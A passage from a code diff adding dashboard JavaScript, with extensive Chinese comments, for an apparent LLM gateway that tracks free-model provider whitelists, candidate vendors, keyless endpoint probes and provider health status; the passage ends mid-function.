+  // ⚠ 有供应商正在冷却时必须照旧重绘: cooldownUntil 是服务端给的固定时间戳, 到点后它自己不会变,
+  // 只看签名的话卡片会永远停在"冷却中"。所以冷却期间给签名掺一个 10 秒的时间桶。
+  const hasCd = s.providers.some((p) => p.cooldownUntil && p.cooldownUntil > Date.now())
+  const sig = JSON.stringify(s.providers) + (hasCd ? '|' + Math.floor(Date.now() / 10000) : '')
+  if (sig !== PROV_SIG) { PROV_SIG = sig; renderProviders() }
+  if (s.ruleset) RULES_CACHE = s.ruleset
+  if (RULES_CACHE) renderRules(RULES_CACHE)
+  loadStats()
+}
+function setLive(on){
+  $('livedot').className = 'dot' + (on ? '' : ' bad')
+  $('livetxt').textContent = on ? '运行中' : '已断开'
+}
+
+function renderRules(rs){
+  if(!rs) return
+  const w = rs.whitelist
+  if (w && w.fetched_at) {
+    const ageH = (Date.now() - new Date(w.fetched_at).getTime()) / 3600000
+    // ⚠ 新鲜度只看"我们上次同步是什么时候"(fetched_at)。以前这里显示 list_date，而 list_date 是
+    // "上游清单里最新的那条数据有多新" —— 社区源停更时它就一直不动，用户会以为白名单没在刷新
+    // （实测反馈："都 19 号了怎么还显示 9-10"）。真正每天在变的是同步时间。
+    const srcs = (w.sources && typeof w.sources === 'object') ? Object.entries(w.sources) : []
+    let live = 0, dated = 0, staleDated = 0, srcTitle = '', staleNames = []
+    const parts = srcs.map(([k, v]) => {
+      // 2026-09-25: mnfst 源已移除，这里不再有"社区"这一档。
+      const nm = k === 'openrouter' ? 'OR' : k
+      const s = String(v)
+      if (s.startsWith('失败')) { srcTitle += `${nm}: 本次拉取失败\n`; return `${nm}✗` }
+      if (s === '实时') { live++; srcTitle += `${nm}: 实时接口，每次同步即当下状态\n`; return `${nm} 实时` }
+      // 停更熔断(服务端 SOURCE_STALE_DAYS): 源清单日期超期 -> 服务端写成 "2026-08-21 ⚠停更46天, 已忽略"。
+      // ⚠ 必须先于下面那套"日期解析"分支判 —— 这个串 new Date() 解析不出来, 会掉进
+      //   `days < 0` 分支被说成"本轮未拉取，沿用上轮缓存", 那是**谎报**: 我们拉到了, 只是它不新。
+      //   两者的处置也完全不同(一个是网络问题、一个是源被废弃), 不能混成一句话。
+      const staleMark = s.match(/^(\d{4}-\d{2}-\d{2}) ⚠停更(\d+)天, 已忽略$/)
+      if (staleMark) {
+        dated++; staleDated++; staleNames.push(nm)
+        srcTitle += `${nm}: 清单数据日期 ${staleMark[1]}（${staleMark[2]} 天前）—— 已停更，本轮起不再参与合并（它的厂商与模型都不进名单）\n`
+        return `${nm} ${staleMark[1].slice(5)}⚠停更(已忽略)`
+      }
+      const dt = new Date(s)
+      const days = isNaN(dt.getTime()) ? -1 : Math.floor((Date.now() - dt.getTime()) / 86400000)
+      // ⚠ 非日期状态必须**原样展示**：发现源没到最小间隔(20h)时服务端写的是「缓存(未到间隔)」，
+      //   而下面那句 `s.slice(5)` 是给 `2026-09-24` 这种日期串切年份用的 —— 套到中文串上会输出
+      //   "未到间隔)"这种碎片，比不显示更像坏了。
+      if (days < 0) { srcTitle += `${nm}: ${s}（本轮未拉取，沿用上轮缓存）\n`; return `${nm} ${s}` }
+      dated++
+      // 阈值 14 天 -> 7 天: 实测 mnfst(社区源) 自 2026-08-21 起停更, 是"厂商行数长期不变"的
+      // **结构性原因**。14 天的门槛太钝, 一个月不更新也只给个不起眼的 ⚠, 用户会以为是网关没刷新。
+      const stale = days >= 7
+      if (stale) { staleDated++; staleNames.push(nm) }
+      srcTitle += `${nm}: 清单数据日期 ${s}（${days} 天前）${stale ? ' —— 清单没在更新；连续超过 14 天不更新会被服务端自动排除出合并' : ''}\n`
+      return `${nm} ${s.slice(5)}${stale ? '⚠停更' : ''}`
+    })
+    const srcTxt = parts.length ? ` · 源 ${parts.join(' / ')}` : ''
+    // 全局告警只在"确实抓不到新东西"时出：同步本身失败，或**没有任何实时源**且带日期的源全部陈旧。
+    // 有实时源(OR)时不算陈旧 —— 它每次同步拿到的都是当下状态。
+    const allStale = !live && dated > 0 && staleDated === dated
+    // 发现源(models.dev)捞到、但没被权威源交叉印证的候选 —— 未实测、多为陌生小厂,
+    // 按用户要求**不进正式名单**(不污染可选列表), 但**不再只报个数**:
+    // 用户 2026-09-21 原话"我不信每次都是那18家, 总有新的大厂给到免费模型, 比如阶跃星辰" ——
+    // 只报个数等于"发现能力在跑但用户完全看不见", 感受就是名单固死了。现在列在下面的候选区里可查可接入。
+    const el = $('rulesmeta')
+    // 卡头只留"白名单几家 + 多久前同步"（2026-09-25）：原来这里挂着
+    // 「源 OR 实时 / freellm 09-25 / modelsdev 实时 · 候选 47 家可查」一整串，把 h2 行挤得满满当当；
+    // 候选数已经独立成卡（「发现更多免费厂商」），源状态明细一直就在 title 里。
+    // 只有真出问题（同步过期 / 有源失败 / 清单全陈旧）才把细节抬回卡头。
+    const srcFail = srcs.some(([, v]) => String(v).startsWith('失败'))
+    const failN = srcs.filter(([, v]) => String(v).startsWith('失败')).length
+    // 代理可达性（服务端每次 /api/state 探一次，60s 缓存）：走代理的源失败时，必须先说清
+    // "是源挂了还是代理没开"。实测最高频的失败原因就是代理没启动 —— 3 个源里 2 个报
+    // ECONNREFUSED <代理地址>，而旧文案只写"部分源拉取失败"，用户会以为网关坏了。
+    const pa = rs.proxyAlive || null
+    const proxyDown = !!(pa && pa.configured && pa.ok === false)
+    if (ageH > 30) el.textContent = `⚠ 白名单已 ${Math.floor(ageH/24)} 天未同步`
+    else if (srcFail && proxyDown) el.textContent = `⚠ 代理未启动（${pa.addr}）· ${failN} 个源拉取失败`
+    else if (srcFail) el.textContent = `⚠ 部分源拉取失败 · 白名单 ${w.hosts} 家${srcTxt}`
+    else if (allStale) el.textContent = `⚠ 上游清单已陈旧，可能抓不到新厂商 · 白名单 ${w.hosts} 家${srcTxt}`
+    else el.textContent = `白名单 ${w.hosts} 家${w.anonHosts ? ` · ${w.anonHosts} 家免 Key` : ''} · ${ageH < 1 ? '刚刚' : Math.floor(ageH) + ' 小时前'}同步`
+    el.title = '白名单由多个上游清单源合并而成，每 6 小时自动同步一次（一天 4 次）。\n\n各源状态：\n' + (srcTitle || '（无）')
+      + (proxyDown ? `\n\n⚠ 代理没有在监听（${pa.addr}）：OpenRouter / freellm 这类源必须走代理，` +
+        '代理没开时它们会一律报「连接被拒绝」。打开代理后点右上角「同步白名单」即可立刻补拉。\n' +
+        '⚠ 代理没开**不会**让白名单变空 —— 它是多源并集，失败的源只是停止贡献新条目，已有名单照常可用。' : '')
+      + (pa && pa.configured && pa.ok === true ? `\n\n代理 ${pa.addr} 正常。` : '')
+      + '\n「实时」= 每次同步拿到的都是当下状态（这类源没有清单版本日期）；带日期的源停更时只影响它覆盖的厂商，其它源照常工作。'
+      + (staleNames.length ? `\n\n⚠ 有源已停更（${staleNames.join('、')}）：白名单是**多源并集**，条目只增不减，` +
+        '所以正式名单的**厂商行数**会长期不变 —— 变的只是各家的模型清单（增删都能在「免费池变动」里看到）。' +
+        '想找新厂商请看下面的「候选厂商」区，那里才是每天在长的部分。' : '')
+      + '\n限时活动型免费（如 B.AI）不走这里，由后台每 6 小时抓官方公告页核对，结论记在「免费池变动」里。'
+      + (w.candidates ? `\n\n候选 ${w.candidates} 家：厂商发现源(models.dev)新捞到、只标明标价 0、我们还没真调过。` +
+        '\n它们不进正式名单（避免陌生小厂混进来），但列在下方候选区可查、可一键接入；接入后会走全池实测，不免费会自动拉黑。' : '')
+  } else {
+    $('rulesmeta').textContent = '⚠ 白名单未同步（断网？），暂用兜底规则'
+  }
+  renderAvailable(w)
+  renderCandidates(w)
+  syncDiscovCard()
+}
+
+// 「发现更多免费厂商」卡的显隐：两块内容都空时整张卡不出现。
+// 只在这一处联动 —— 显隐只取决于"有没有数据"，而数据只在 renderRules 里更新；
+// 展开/收起（avail-all / cand-all）不改变有没有数据，所以不必重复调用。
+function syncDiscovCard(){
+  const card = $('discovcard'); if (!card) return
+  // ⚠ 判据必须是"有没有数据"，不能再看 availbox/candbox 的 display —— 它们现在被 #discov-b
+  //   包着，用户收起后整块 display:none，卡片会被误判成"没内容"而整张消失。
+  const on = AVAIL.length > 0 || CAND.length > 0
+  card.style.display = on ? '' : 'none'
+  const t = $('discov-t'); if (t) t.textContent = OPEN_BOX.has('discov') ? '收起' : '展开'
+  // 卡头元信息：候选总数原来挂在「免费模型目录」的 h2 上，拆卡后跟着搬过来
+  const m = $('discovmeta')
+  if (m) {
+    const bits = []
+    if (AVAIL.length) bits.push(`白名单未接入 ${AVAIL.length} 家`)
+    if (CAND.length) bits.push(`发现源候选 ${CAND.length} 家`)
+    m.textContent = bits.join(' · ')
+  }
+}
+// 白名单里有、但还没接入的免费厂商 —— 名单每天自动更新, 自动抓到的新厂商会自己出现在这里,
+// 用户不必去别处找"最近有哪些免费厂商可白嫖"。
+let AVAIL = []          // 未接入的免费厂商
+let AVAIL_OPEN = false  // 是否已展开全部
+let LAST_WL = null      // 最近一次的白名单数据（展开时重画用）
+function renderAvailable(w){
+  const box = $('availbox'); if (!box) return
+  LAST_WL = w
+  const list = (w && w.hostList) || []
+  if (!list.length){ AVAIL = []; box.style.display = 'none'; return }
+  const used = new Set((LAST || []).map((p) => { try { return new URL(p.base_url).hostname } catch { return '' } }))
+  // 只列"真的有免费模型"的: models 为 0 的是已取消免费档的封闭名单厂商(如 Cerebras/LongCat), 列出来会误导
+  const rest = list.filter((h) => h.models > 0 && !used.has(h.host)).sort((a, b) => b.models - a.models)
+  if (!rest.length){ AVAIL = []; box.style.display = 'none'; return }
+  box.style.display = ''
+  AVAIL = rest
+  const shown = AVAIL_OPEN ? rest : rest.slice(0, 12)
+  const more = rest.length - shown.length
+  const chips = shown.map((h) => {
+    const pr = (w && w.probe && w.probe[h.host]) || null
+    const tip = `${h.source || h.host} · ${h.host}\n白名单里已确认有 ${h.models} 个免费模型，你还没接入。\n点一下把接入信息填进右侧「添加供应商」，填 Key 后点「拉取免费模型」即可。`
+      + (h.anon ? `\n\n✅ 免 Key 实测可调用：巡检已用**不带 Key** 的请求调通这家端点${h.anonModel ? `（试通模型 ${h.anonModel}）` : ''} —— 不需要申请 Key，也就不存在扣费通道。接入时 Key 随便填一个占位符即可。` : '')
+      + (pr && pr.apiBase ? `\n无 Key 巡检探到的可用路径：${pr.apiBase}` : '')
+    return `<span class="chip avail" data-act="pick-avail" data-host="${esc(h.host)}" role="button" tabindex="0" title="${esc(tip)}">${esc(h.source)} <b style="color:var(--accent);font-weight:600">${h.models}</b>`
+      + (h.anon ? `<span class="anonmark" title="巡检已用无 Key 请求实测调通这家端点 —— 免 Key 即可用，不需要申请 Key，也就不存在扣费">免Key</span>` : '')
+      + `</span>`
+  }).join('')
+    + (more > 0 ? `<span class="chip more" data-act="avail-all" role="button" tabindex="0">+${more} 家</span>` : '')
+  const anonN = rest.filter((h) => h.anon).length
+  box.innerHTML = `<div class="sect"><span class="sect-t">白名单里还没接入</span><span class="sect-n" title="名单每天自动更新，自动抓到的新厂商会出现在这里；数字是免费模型数。点任意一家会把接入信息填进右侧「添加供应商」。标了「免Key」的是巡检用无 Key 请求实测调通过的 —— 不用申请 Key。">${rest.length} 家${anonN ? ` · 其中 ${anonN} 家免 Key 可调用` : ''} · 数字是免费模型数，点一下填入接入信息</span></div><div style="display:flex;gap:5px;flex-wrap:wrap">${chips}</div>`
+}
+
+// ── 候选厂商区（2026-09-21 新增）────────────────────────────────
+// 回答用户那句"我不信每次都是那18家，总有新的大厂给到免费模型，比如阶跃星辰"。
+// 事实是: 白名单的发现源(models.dev)每轮都捞到几十家新厂商, 但它们**只进 candidates 不进 hosts**
+// (用户 2026-09-19 要求过"小厂家和没测试过的别放进去")。于是发现能力一直在跑, 用户却完全看不到。
+// 更根本的原因: 白名单是**多源并集、只增不减**，而权威源(freellm / OpenRouter)覆盖的是"清单型免费"，
+// 新厂商主要靠发现源(models.dev)捞 —— 它捞到的又只进 candidates。所以正式名单的厂商行数结构性地
+// 不会变, 变的只是各家的模型清单。(2026-09-25 前还多一个已停更的社区源 mnfst, 现已移除。)
+// 这里把候选摊开给用户自己挑。三条设计约束:
+//   ① **不污染主列表**: 独立区块、默认收起、视觉弱化(不抢正式名单的位置)。
+//   ② **必须能认出来**: 候选里大量是 `api.xyz.ai` 裸域名, 用户原话"不知道那几个是干嘛的" ——
+//      所以服务端给已知厂商配了中文名(CANDIDATE_LABELS), 有名字的排前面。
+//   ③ **不能假装已核实**: 统一标注"只标明标价 0、未实测", 并说清接入后会走全池实测、不免费会自动拉黑。
+let CAND = []          // 候选厂商(服务端投影)
+let CAND_OPEN = false
+let CAND_Q = ''
+function renderCandidates(w){
+  const box = $('candbox'); if (!box) return
+  const all = (w && w.candidateList) || []
+  CAND = all
+  if (!all.length){ box.style.display = 'none'; return }
+  box.style.display = ''
+  const kw = CAND_Q.trim().toLowerCase()
+  const hit = kw ? all.filter((c) => `${c.label} ${c.source} ${c.host} ${(c.sample || []).join(' ')}`.toLowerCase().includes(kw)) : all
+  // 默认只显示有中文名的(用户真正可能认识的大厂) + 前若干家, 避免一上来糊 48 行陌生域名
+  // 巡检结论优先(2026-10-06)：候选区的用途是"找一家**能接入**的新厂商"，而 probe.state 正是
+  // "这家摸不摸得到"的最强证据 —— 原来只按"有没有中文名"排，于是"连不通 / 没有模型列表"的
+  // 陌生域名能排在有中文名的大厂前面，用户点进去才发现是空头。现在同档内按证据强度排：
+  // listed(能匿名列模型, 最强) > needs_key(端点活着要 Key) > exists/未探测 > no_list > unreachable。
+  // ⚠ 只改**顺序**不改集合：`base` 的裁剪规则与「展开其余 N 家」都照旧，想找的人照样找得到。
+  const PROBE_ORDER = { listed: 0, needs_key: 1, exists: 2, skip: 3, no_list: 4, unreachable: 5 }
+  const pord = (c) => { const s = (c.probe && c.probe.state) || ''; return s in PROBE_ORDER ? PROBE_ORDER[s] : 3 }
+  const named = hit.filter((c) => c.label).sort((a, b) => pord(a) - pord(b))
+  const rest = hit.filter((c) => !c.label).sort((a, b) => pord(a) - pord(b))
+  // ⚠ 2026-09-25: 上面那句"避免糊 48 行"其实一直没生效 —— CANDIDATE_LABELS 已长到 49 条,
+  //   实测 48 家候选里 47 家都有 label, 于是 named 就等于全集, 裁剪形同虚设。
+  //   后果在候选区**有数据之后**才暴露(它空了很久): 47 行 = 1533px, 页面从 1672px 撑到 3520px。
+  //   这里补一道硬上限 —— 想找的人靠搜索框和「展开其余 N 家」chip 照样找得到, 不是把功能藏掉。
+  //   CAND_CAP 从 12 收到 5（2026-09-25）：这一块实测 525px（12 行 + 三行说明 + 搜索框），
+  //   是右列比左列高出 1000px 的主要来源之一。候选是**低频探索**需求（日常看的是已接入的 7 家），
+  //   默认 5 行 + 搜索框 + 「展开其余 N 家」足够找到人，不值得占首屏半屏。
+  const CAND_CAP = 5
+  // ⚠ 2026-10-19 修「搜索不了」: 原来搜索也走 CAND_CAP=5 —— 命中 30 家只显示 5 家,
+  //   用户搜一个具体厂商名, 它要是排在 pord(证据强度) 后面就等于"搜不到"。
+  //   搜索是**定向查找**, 结果必须完整(60 只是防极端情况撑爆版面); 不搜索时才按版面红线裁剪。
+  const base = kw ? hit.slice(0, 60) : (CAND_OPEN ? hit : [...named, ...rest.slice(0, 8)].slice(0, CAND_CAP))
+  const hidden = hit.length - base.length
+  // 无 Key 巡检结论 -> 徽标。这一栏是回答"候选的厂家为什么你不测试"的关键:
+  // 不接 Key 也能给出「能匿名列模型 / 端点活着需 Key / 接入点待确认 / 连不上」四档结论
+  // (服务端 patrolWhitelist 的候选侧, 每天一次)。⚠ 措辞必须区分"证明存在"与"证明免费":
+  // needs_key 只说明厂商真实存在, 免费与否仍只是数据源的说法。
+  const PROBE_LABEL = {
+    listed: '能匿名列出模型（证据最强）', needs_key: '端点活着，返回 401/403 需要 Key',
+    exists: '端点活着（405/400/5xx），但这个网关不提供「列出模型」接口',
+    no_list: '常见路径都没有模型列表（接入点路径待确认）', unreachable: '连不通', skip: '接入点含占位符，无法探测',
+  }
+  const probeBadge = (c) => {
+    const p = c.probe; if (!p) return ''
+    if (p.state === 'listed') {
+      // ⚠ 徽标要短(移动端一行放不下太多徽标), 细节放 title。
+      // ⚠ 措辞必须是"源声明 M 个中 N 个查无", 不能写成"N 个查无" —— 否则会被读成
+      //   "端点 693 个里有 11 个缺失", 而实际是"源声明的 11 个全都不存在"(实测 Requesty 就是这种)。
+      const allGone = p.missingCount && p.missingCount >= c.models
+      // 行上只留一句人话（细节全在 title）：能匿名列模型 = 绿；源声明的模型全查无 = 橙。
+      // 原文案「实测可列 717 个 ⚠源声明全查无」把两个结论挤在一个徽标里，又长又难读。
+      const listedTxt = p.missingCount
+        ? `可列模型 ${p.listedCount} · 源 ${p.missingCount} 个查无`
+        : `可列模型 ${p.listedCount}`
+      const listedCls = p.missingCount ? 'p_stale' : 'p_listed'
+      const why = p.missingCount
+        ? (allGone
+          ? `但这个数据源声明的 ${c.models} 个模型在端点列表里**一个都找不到** —— 该源的这批数据不可信。`
+          : `源声明的 ${c.models} 个里有 ${p.missingCount} 个在端点列表里查不到，说明该源的数据不完整。`)
+        : (p.unverifiable
+          ? '端点列出的模型数少于源声明，可能是分页/只列部分，因此不下"查无"结论。'
+          : '源声明的模型已与端点逐一核对，全部对得上 —— 这是候选里最可信的一档。')
+      return `<span class="vs ${listedCls}" title="${esc(`无 Key 直接探到 ${p.apiBase}/models 能匿名列出 ${p.listedCount} 个模型。${why}`)}">${listedTxt}</span>`
+    }
+    if (p.state === 'needs_key') return `<span class="vs p_needs_key" title="${esc(`无 Key 探测 ${p.apiBase || ''}/models 返回 ${p.detail || '401/403'} —— 端点确实活着，但「免费」仍只是数据源的说法，接上 Key 才能真正验。`)}">实测需 Key</span>`
+    // 「端点存在」比「需 Key」弱、比「待确认」强: 路径活着 = 厂商真实存在, 但拿不到模型名。
+    // ⚠ 别把它写成「需 Key」—— 405 只证明路径在, 不证明要鉴权。
+    if (p.state === 'exists') return `<span class="vs p_exists" title="${esc(`无 Key 探测 ${p.apiBase || ''}/chat/completions 返回 ${p.detail || '405/400'} —— 端点确实活着、厂商真实存在，但这个网关不提供「列出模型」接口，所以没法核对源声明的模型名。接上 Key 拉一次就知道。`)}">端点存在</span>`
+    if (p.state === 'no_list') return `<span class="vs p_no_list" title="${esc(`无 Key 探测时常见路径（/v1、/models、/api/v1、/openai/v1、/compatible-mode/v1）都没有模型列表（${p.detail}）—— 不代表厂商死了，多半是接入点路径不同，要查厂商文档。`)}">接入点待确认</span>`
+    if (p.state === 'unreachable') return `<span class="vs p_unreachable" title="${esc(`无 Key 探测连不上（${p.detail || 'DNS/超时'}）。名单上写的「免费」很可能是空头支票。`)}">实测连不通</span>`
+    if (p.state === 'skip') return `<span class="vs p_skip" title="接入点含占位符，无法探测">无法探测</span>`
+    return ''
+  }
+  const rows = base.map((c) => {
+    const nm = c.label || c.source || c.host
+    // 名字行放最前: 窄屏时 .vn 会被省略号截断(见 CSS 里的优先级说明), 完整名必须能在 hover 里看到。
+    const tip = `${nm}\n接入点 ${c.host}\n来源 ${c.source}\n${c.models} 个标价 0 的模型：${(c.sample || []).join(', ')}${c.models > (c.sample || []).length ? ' …' : ''}`
+      + (c.probe
+        ? `\n\n无 Key 实测：${PROBE_LABEL[c.probe.state] || c.probe.state}`
+          + (c.probe.apiBase ? `\n探通路径：${c.probe.apiBase}/models` : '')
+          + (c.probe.missingCount ? `\n源声明里有 ${c.probe.missingCount} 个模型端点查无` : '')
+        : '\n\n⚠ 还没轮到巡检（每天一次）')
+      + '\n\n接入后仍会走全池实测，不免费会自动拉黑。'
+    return `<div class="vopt" data-act="pick-candidate" data-host="${esc(c.host)}" role="button" tabindex="0"`
+      + ` title="${esc(tip)}">`
+      + `<span class="vn">${esc(nm)}</span>`
+      + (c.label ? '' : `<span class="vs cand" title="没有中文名/接入说明的厂商，来自发现源">未收录</span>`)
+      + (c.suspect ? `<span class="vs keybad" title="该候选的数据已被证伪过（标了大量实际收费的模型），列出来只为透明，不建议接入">慎用</span>` : '')
+      + probeBadge(c)
+      // ⚠ 这里**不放** `.vnote`(模型样例)。曾经放过, 但候选行要塞 名字+3 个徽标+域名+免费数,
+      //   挤不下时它会缩成单字碎片("g"/"in"/"mo"), 截图里像坏了; 而放它就得从名字身上抠宽度,
+      //   实测 47 行里 38 行名字只剩 "Um…"(见 CSS 的优先级说明)。样例模型改由 hover 弹层提供(见上面的 tip)。
+      + `<span class="vs nfree">免费 ${c.models}</span></div>`
+  }).join('')
+  const st = (s) => all.filter((c) => c.probe && c.probe.state === s).length
+  const untested = all.filter((c) => !c.probe).length
+  // 候选区的"规模"要说清楚：用户反馈"感受不到最全"，而旧文案只报家数 —— 54 家 × 355 个模型
+  // 这件事本身才是"发现能力在跑"的证据。默认只露 5 行是版面红线（右列高度），不放开。
+  const allModels = all.reduce((n, c) => n + (c.models || 0), 0)
+  // ⚠ 2026-10-19 修「搜索不了」的真正原因: 搜索框就在下面这坨 innerHTML 里, 每敲一个字都会
+  //   整块重建 -> 旧 input 被销毁 -> 焦点丢到 body -> 第二个字符打不进去(用户看到的就是"搜不了")。
+  //   重建前记下焦点与光标, 重建后原样还回去。光标位置用 input 的 selectionStart(敲字后已是新值)。
+  const keepFocus = !!(document.activeElement && document.activeElement.classList && document.activeElement.classList.contains('vsearch'))
+  const caret = keepFocus ? document.activeElement.selectionStart : null
+  box.innerHTML = `<div class="sect">`
+    + `<span class="sect-t">发现源候选</span>`
+    + `<span class="sect-n" title="发现源（models.dev）每天新捞到、只标明标价 0 的厂商。按你的要求不进正式名单；点一行把接入信息填进右侧「添加供应商」，悬停看它声明的模型。接入后会走全池实测，不免费会自动拉黑。⚠ 如果巡检发现某家**免 Key 就能调用**，它会被自动转入正式名单 —— 那批不需要你做任何事。">${all.length} 家 · ${allModels} 个模型 · 未实测，点一下填入接入信息</span>`
+    + `</div>`
+    + `<input class="vsearch" placeholder="搜索候选厂商 / 域名 / 模型…" value="${esc(CAND_Q)}" oninput="CAND_Q=this.value;renderCandidates(LAST_WL)">`
+    + `<div>${rows || '<div class="grp">没有匹配的候选厂商</div>'}</div>`
+    + `<div style="margin-top:7px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">`
+    + ((hidden > 0 || CAND_OPEN) ? `<span class="chip more" data-act="cand-all" role="button" tabindex="0">${CAND_OPEN ? '收起' : `展开其余 ${hidden} 家`}</span>` : '')
+    + `<span class="sect-n" title="不接 Key 也能给出结论：能匿名列出模型 / 端点活着需要 Key / 端点存在但不提供模型列表 / 接入点待确认。⚠ 它只证明厂商存在，不证明免费 —— 免费与否仍只是数据源的说法。">无 Key 巡检：${st('listed')} 可列模型 · ${st('needs_key')} 需 Key${st('exists') ? ` · ${st('exists')} 端点存在` : ''} · ${st('no_list') + st('unreachable') + st('skip')} 待确认${untested ? ` · ${untested} 未测` : ''}</span>`
+    + `</div>`
+  // 把焦点与光标还给搜索框(见上面 keepFocus 的说明), 否则连续输入第二个字符就断了
+  if (keepFocus) {
+    const el = box.querySelector('.vsearch')
+    if (el) {
+      el.focus()
+      const n = caret == null ? el.value.length : caret
+      try { el.setSelectionRange(n, n) } catch {}
+    }
+  }
+}
+function pickCandidate(host){
+  const c = CAND.find((x) => x.host === host); if (!c) return
+  // 无 Key 巡检探通过的话直接用那条路径 —— 比一律猜 /v1 靠谱得多。
+  // 实测: 不少厂商 /v1/models 返 404, 换 /compatible-mode/v1 或 /api/v1 才是对的
+  // (阿里云百炼 Token Plan、dashscope、hetzner 都是这样)。
+  const probed = c.probe && c.probe.apiBase
+  const base = probed || ('https://' + host + '/v1')
+  $('p_name').value = c.label || c.source || host
+  $('p_base').value = base
+  $('p_proxy').checked = true
+  $('modellist').style.display = 'none'
+  $('vbtntxt').textContent = c.label || c.source || host
+  const how = probed
+    ? `接入点已按无 Key 巡检探到的可用路径填好（${base}）。`
+    : `接入点 ${host} · 巡检还没探到可用路径，路径可能不是 /v1，拉不到就按厂商文档改 Base URL。`
+  toast('已填入候选厂商', `${how}填好 API Key 后点「拉取免费模型」。这是发现源捞到的候选，接入后会走全池实测，不免费会自动拉黑。`, probed ? 'ok' : 'warn', 9000)
+}
+
+// 点「白名单里还没接入」= 同 pickCandidate 的回填动作，但文案要区分开：
+// 这些厂商是白名单（每天同步）里**已确认有免费模型**的，只是还没接 —— 比候选区那 47 家可信得多。
+function pickAvail(host){
+  const a = AVAIL.find((x) => x.host === host) || { host }
+  const pr = (LAST_WL && LAST_WL.probe && LAST_WL.probe[host]) || null
+  const base = (pr && pr.apiBase) || ('https://' + host + '/v1')
+  const nm = a.source || a.label || host
+  $('p_name').value = nm
+  $('p_base').value = base
+  $('p_proxy').checked = true
+  $('modellist').style.display = 'none'
+  $('vbtntxt').textContent = nm
+  toast('已填入白名单厂商', `${nm} 在白名单里、已确认有 ${a.models || '?'} 个免费模型，只是还没接入。`
+    + `接入点已按无 Key 巡检结果填好（${base}）。填好 API Key 后点「拉取免费模型」——`
+    + '接入后会走全池实测，不免费会自动拉黑，不需要你手动筛。', 'ok', 10000)
+}
+
+// 展开卡片底部的成败数是**全期累计**（server.mjs 里 p.ok / p.err 累加后持久化在 config.json），
+// 包含早期调试产生的失败 —— 和「模型使用记录」卡头是同一个坑（见那里的注释）。
+// 差别在于：这里是"点开才看"的次要信息，累计本身有意义（"这家一共成功过多少次"），
+// 所以不换口径，只把口径写进 title，别让人拿它当"现在好不好"。
+// 展开卡片底部成败数的口径说明（只出现在 title 里）。
+// p.ok / p.err 写进 config.json、跨重启保留，包含早期调试产生的失败 —— 不写明就会被读成"这家现在很差"。
+// 主信息位给的是**最近 7 天**（服务端 /api/state 的 p.recent），口径与「模型使用记录」卡头一致。
+const FOOT_TIP = '全期累计值（含早期调试产生的失败，不代表当前状态）。'
+function renderProviders(){  const el = $('plist'); el.innerHTML = ''
+  if (!LAST.length) {
+    el.innerHTML = '<div class="empty">还没有供应商，先在右侧「添加供应商」填入 Key。</div>'
+    const s0 = $('provsum'); if (s0) s0.textContent = '未接入'
+    return
+  }
+  const now = Date.now()
+  // 卡片默认折叠, 光看行尾徽标要数 7 行才知道几家告警 —— 这里汇成一行总览
+  const PROV_STAT = { ok: 0, warn: 0, cd: 0, err: 0, off: 0, idle: 0 }
+  LAST.forEach((p) => {
+    const all = (p.models && p.models.length ? p.models : [p.model]).filter(Boolean)
+    const blk = p.blocked ? Object.keys(p.blocked) : []
+    const qtn = p.quarantine ? Object.keys(p.quarantine) : []
+    const dis = p.disabledModels ? Object.keys(p.disabledModels) : []
+    // live = 真正在 auto 池里的模型；拉黑/隔离的已经被摘出去，所以不再占位
+    const live = all.filter((m) => !blk.includes(m) && !qtn.includes(m))
+    const enabledCount = live.filter((m) => !dis.includes(m)).length
+
+    // ── 免费体检：防静默扣费的闸门 ──
+    // lastSweep = { at, total, ok, httpFail, netErr }；服务端只在"至少一个模型真收到上游响应"时才写
+    // lastSweepAt，所以整池网络失败（代理没开）时 sweepAgo 会继续涨，8 小时后自然转橙色告警。
+    const sw = p.lastSweep || null
+    const swDetail = sw ? `本轮 ${sw.total} 个模型：正常 ${sw.ok} / 上游报错 ${sw.httpFail} / 网络失败 ${sw.netErr}` : ''
+    const sweepAgo = p.lastSweepAt ? (now - new Date(p.lastSweepAt).getTime()) : null
+    const sweepNothing = sw && sw.total > 0 && sw.ok === 0
+    const sweepOverdue = p.enabled !== false && enabledCount > 0 && (sweepAgo == null || sweepAgo > 8 * 3600000)
+    const sweepLabel = sweepAgo != null ? fmtAgo(sweepAgo) : (sw ? '未生效' : '未体检')
+    let sweepHtml = ''
+    if (p.enabled !== false && enabledCount > 0) {
+      if (sweepAgo == null || sweepOverdue || sweepNothing) {
+        const tip = sweepAgo == null
+          ? (sw ? '最近一轮体检没有任何模型验证成功（多为代理未开或断网），闸门实际未生效，下个周期会重扫' : '尚未对池内模型做过真实试调，无法确认它们现在仍免费')
+          : sweepOverdue
+            ? '全池实测已超过 8 小时未跑（应每 6 小时一次）。若厂商在此期间悄悄把模型转收费，会漏检并被计费'
+            : '最近一轮体检没有任何模型验证成功，闸门实际未生效'
+        sweepHtml = `<span class="sweepbad" title="${tip}。${swDetail}">⚠ 免费体检 ${sweepLabel}${sw ? ` · ${sw.ok}/${sw.total} 正常` : ''}</span>`
+      } else {
+        sweepHtml = `<span class="sweepok" title="已对池内模型逐个真实试调，确认当前仍可免费调用。${swDetail}">免费体检 ${sweepLabel}${sw && sw.ok < sw.total ? ` · ${sw.ok}/${sw.total} 正常` : ''}</span>`
+      }
+    }
+
+    // 状态分档（2026-09-26 第八轮重做）：**不再拿"单次 lastError"当现状**。
+    // 旧判据（lastError 非空 → 橙「偶发失败」）有两个硬伤：
+    //   ① lastError 只在下一次**成功**时清空（server.mjs:3009），没有时效。实测 5 家的 lastError
+    //      全是 2.5~6 小时前的一次上游抖动，而同一行的 tooltip 自己写着"属于常态、不需要处理"
+    //      —— 既然是常态，就不该用告警色（违反项目红线「常态信息不能用告警色」）。
+    //   ② 它自我固化：失败 → 该家权重下降 → 更少被 auto 选中 → 更清不掉 → 橙色永久挂着。
+    //      实测 openrouter 近 7 天**零次真实调用**（最新记录还是 9-19），却因为一次**合成探针**的
+    //      403 长期顶着「偶发失败」—— 拿探针结果冒充真实使用表现。
+    // 新判据按优先级：账号级问题 > 冷却 > 近 7 天成功率（有样本时）> 无样本给中性灰。
+    const rc = p.recent   // 近 7 天 {ok,err,n}；null = 这 7 天没有任何真实调用
+    let st
+    if (p.enabled === false) st = { cls: 'off', txt: '已停用' }
+    else if (p.cooldownUntil && p.cooldownUntil > now) st = { cls: 'cd', txt: '冷却中' }
+    else if (p.accountIssue) st = { cls: 'err', txt: 'Key 不可用' }
